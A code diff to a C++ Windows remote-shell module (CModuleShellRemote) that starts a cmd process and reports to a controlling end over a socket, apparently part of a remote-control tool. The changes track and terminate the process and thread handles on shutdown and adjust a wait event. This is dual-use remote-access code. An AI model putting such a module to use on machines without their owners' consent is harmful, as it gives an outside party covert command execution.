@@ -13,10 +13,26 @@ CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(p
 
 	m_hRead = NULL;
 	m_hWrite = NULL;
+
+	m_hCmdProcess = NULL;
+	m_hCmdMainThread = NULL;
 }
 
 
 CModuleShellRemote::~CModuleShellRemote() {
+	if (m_hCmdProcess != NULL) {
+		TerminateProcess(m_hCmdProcess, 0);
+		WaitForSingleObject(m_hCmdProcess, INFINITE);
+		CloseHandle(m_hCmdProcess);
+		m_hCmdProcess = NULL;
+	}
+	if (m_hCmdMainThread != NULL) {
+		TerminateThread(m_hCmdMainThread, 0);
+		WaitForSingleObject(m_hCmdMainThread, INFINITE);
+		CloseHandle(m_hCmdMainThread);
+		m_hCmdMainThread = NULL;
+	}
+
 	if (m_hRecvPacketShellRemoteCloseEvent != NULL) {
 		CloseHandle(m_hRecvPacketShellRemoteCloseEvent);
 		m_hRecvPacketShellRemoteCloseEvent = NULL;
@@ -117,13 +133,15 @@ DWORD WINAPI CModuleShellRemote::RunCmdProcessThreadFunc(LPVOID lParam)
 		DebugPrint("error = 0x%x\n", GetLastError());
 		goto Clean;
 	}
+	pThis->m_hCmdProcess = pi.hProcess;
+	pThis->m_hCmdMainThread = pi.hThread;
 
 	// 创建好进程后就向主控端发送CONNECT响应包。
 	pThis->m_pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
 	SetEvent(pThis->m_hSendPacketShellRemoteConnectEvent);
 
 	// 等待关闭
-	WaitForSingleObject(pThis->m_hRecvPacketShellRemoteCloseEvent, INFINITE);
+	WaitForSingleObject(pThis->m_pChildSocketClient->m_hChildSocketClientExitEvent, INFINITE);
 
 Clean:
 	//释放句柄
@@ -211,7 +229,6 @@ VOID CModuleShellRemote::LoopReadAndSendCommandReuslt() {
 			memset(SendBuf, 0, sizeof(SendBuf));
 			dwBytesRead = 0;
 			Sleep(100);
-			printf("****%d\n", dwBytesRead);
 		}
 	}
 }
